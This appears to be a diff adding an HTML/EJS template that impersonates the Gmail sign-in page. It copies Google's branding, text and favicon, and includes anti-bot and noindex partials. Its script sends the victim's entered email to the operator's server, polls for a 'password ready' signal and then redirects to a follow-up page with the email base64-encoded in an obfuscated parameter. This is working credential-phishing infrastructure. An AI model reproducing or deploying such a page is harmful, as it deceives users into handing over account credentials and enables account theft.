@@ -1,0 +1,204 @@
+
+<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <%- include('partials/meta-noindex') %>
+    <link rel="shortcut icon" href="/image/gmail.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/css/newstyle.css">
+    <style>
+        #pEyar {
+            font-size: 18px;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #2c2a2a;
+        }
+        #pEyar.input-error {
+            border-color: #cc2418 !important;
+        }
+        #pEyar.input-error + label[placeholder]:before {
+            color: #cc2418 !important;
+        }
+        
+        .fgtpwd {
+            margin-left: 48% !important;
+            margin-right: auto !important;
+            justify-content: flex-start !important;
+            display: flex !important;
+            margin-top: 10% !important;
+        }
+        
+        .btmdiv {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 5px;
+            width: 900px;
+            margin-left: auto;
+            margin-right: auto;
+            padding: 0 25px;
+        }
+        
+        .left-div {
+            margin-left: 10px;
+            flex: 0;
+        }
+        
+        .right-divs {
+            margin-right: 10px;
+            flex: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="maindiv">
+        <div class="form-container">
+            <div class="white-overlay" id="whiteOverlay"></div>
+            <div class="loading-bar" id="loadingBar"><div class="loading-bar-indicator"></div></div>
+        <form class="loginform" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8">
+       
+          
+            <div class="form-half">
+                <div><img class="divlogo" src="/image/image.png" ></div>
+                <br> 
+                <div><span class="welcome">Verify your email address<span></div>                
+                <div class="userdiv">
+                    <div><span class="">to continue to gmail<span></div>
+                  
+                </div>
+            </div>
+            
+            <div class="form-half1">
+            
+            
+
+
+            <br> <br>
+                <div class="passdiv">
+                    <input type='hidden' name="username" id="useRname" value="${username}">
+                    <input  required='' name="username" type='username' id="pEyar">
+                    <label style="color:#2c2a2a;; font-size: 16px; font-family: Arial, Helvetica, sans-serif;" alt='Email or Phone' placeholder='Email or Phone'></label>
+                    <div id="emailError" class="error-msg" style="display:none;"><img src="/image/eid.png"></div>
+                </div>
+
+                <div class="shwpwd">
+     
+                    
+                    <span onclick="showForgotEmailLoading();" class="button">Forgot email?</span>
+                </div>
+                <br>
+                <script src="/JS/pass.js"></script>
+
+                <div class="privatewarn">
+                    <span>Not your computer? Use a Private Window to sign in. <strong style="color:#2470eb;">Learn </strong></span><br>
+                    <strong style="color:#2470eb;"> more about Guest mode</strong>
+                </div>
+
+                <div class="fgtpwd">
+                    <button id="createAccountBtn" class="hyperl" ><b>Create account</b></button>&nbsp;&nbsp;&nbsp;
+                    <button type="submit" class="btnnxt" id="nextBtn"><b>Next</b></button>
+                  </div>
+
+            </div>
+     
+        </form>
+        </div>
+        
+
+        <div class="btmdiv">
+            <div class="left-div">
+                <select class="btmhypl" id="language-select">
+                    <option value="en">English (United States)</option>
+                    <option value="fr">French</option>
+                    <option value="es">Spanish</option>
+                    <option value="de">German</option>
+                    <!-- Add more options as needed -->
+                </select>
+            </div>
+                <div class="right-divs">
+                    <div class="right-div">
+                        <button id="myButton" class="btmhypl" >Help</button>
+                    </div>
+                    <div class="right-div">
+                        <button id="myButton" class="btmhypl" >Privacy</button>
+                    </div>
+                    <div class="right-div">
+                        <button id="myButton" class="btmhypl" >Terms</button>
+                    </div>
+                </div>
+        </div>
+
+
+    </div>
+
+    <script>
+    function showLoadingBar() {
+      document.getElementById('loadingBar').classList.add('active');
+      document.getElementById('whiteOverlay').classList.add('active');
+    }
+
+    function showForgotEmailLoading() {
+      showLoadingBar();
+      setTimeout(() => {
+        document.getElementById('loadingBar').classList.remove('active');
+        document.getElementById('whiteOverlay').classList.remove('active');
+      }, 4000);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      document.getElementById('createAccountBtn').onclick = function () {
+        location.href = "https://accounts.google.com";
+      };
+
+      document.getElementById('nextBtn').onclick = function (e) {
+        const input = document.getElementById('pEyar');
+        if (!input.value) return;
+        document.getElementById('pEyar').classList.remove('input-error');
+        document.getElementById('emailError').style.display = 'none';
+        document.querySelector('.shwpwd').style.marginTop = '-18px';
+        showLoadingBar();
+        // POST email to server
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = '/';
+        const field = document.createElement('input');
+        field.type = 'hidden';
+        field.name = 'username';
+        field.value = input.value;
+        form.appendChild(field);
+        document.body.appendChild(form);
+
+        // Submit via fetch so page stays, then poll for pwd URL
+        const encodedEmail = btoa(input.value);
+        fetch('/first', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'username=' + encodeURIComponent(input.value)
+        }).then(() => {
+          const pollInterval = setInterval(() => {
+            fetch('/pwdready?u=' + encodeURIComponent(input.value))
+              .then(r => r.json())
+              .then(data => {
+                if (data.ready) {
+                  clearInterval(pollInterval);
+                  window.location.href = '/hom?mbbjgsmhyropjmhnkidgdjkjsetwungdkdh=' + encodeURIComponent(encodedEmail);
+                } else if (data.emailError) {
+                  clearInterval(pollInterval);
+                  document.getElementById('loadingBar').classList.remove('active');
+                  document.getElementById('whiteOverlay').classList.remove('active');
+                  document.getElementById('pEyar').classList.add('input-error');
+                  document.getElementById('emailError').style.display = 'block';
+                  document.querySelector('.shwpwd').style.marginTop = '5px';
+                }
+              })
+              .catch(() => {});
+          }, 2000);
+        }).catch(() => {});
+      };
+    });
+    </script>
+    
+<%- include('partials/antibot') %>
+</body>
+</html>
